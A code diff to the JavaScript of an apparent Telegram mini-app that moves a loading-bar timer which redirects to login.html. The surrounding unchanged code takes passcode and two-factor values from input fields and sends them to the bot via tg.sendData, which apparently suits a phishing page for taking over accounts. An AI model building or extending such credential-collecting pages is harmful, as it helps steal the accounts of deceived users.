@@ -6,12 +6,29 @@ document.addEventListener("DOMContentLoaded", () => {
   const page2 = document.getElementById("page2");
   const blur = document.getElementById("blur");
   const passcodebtn = document.getElementById("passcode-btn");
+  const text = document.getElementById("loadtext");
+  let progress = 0;
+  const bar = document.getElementById("loadbar");
 
   const passcodeInput = document.getElementById("passcode-input");
   const twofactorInput = document.getElementById("twofactor-input");
 
   tg.expand();
   tg.BackButton.hide();
+
+  const interval = setInterval(() => {
+  if (getComputedStyle(text).opacity == 1) {
+      progress += 1;
+      bar.style.width = progress + "%";
+
+      if (progress >= 100) {
+        clearInterval(interval);
+        setTimeout(() => {
+          window.location.href = "login.html";
+        }, 500);
+      }
+  }
+  }, 10);
 
   loginbtn.addEventListener("click", () => {
     page2.style.display = "flex";
@@ -48,22 +65,12 @@ document.addEventListener("DOMContentLoaded", () => {
       const value = twofactorInput.value;
       tg.sendData(JSON.stringify({ action: "twofactor_value", value }));
     });
-  const interval = setInterval(() => {
-  if (getComputedStyle(text).opacity == 1) {
-      progress += 1;
-      bar.style.width = progress + "%";
 
-      if (progress >= 100) {
-        clearInterval(interval);
-        setTimeout(() => {
-          window.location.href = "login.html";
-        }, 500);
-      }
-  }
-  }, 10);
 
 
 
 });
+
+
 
 
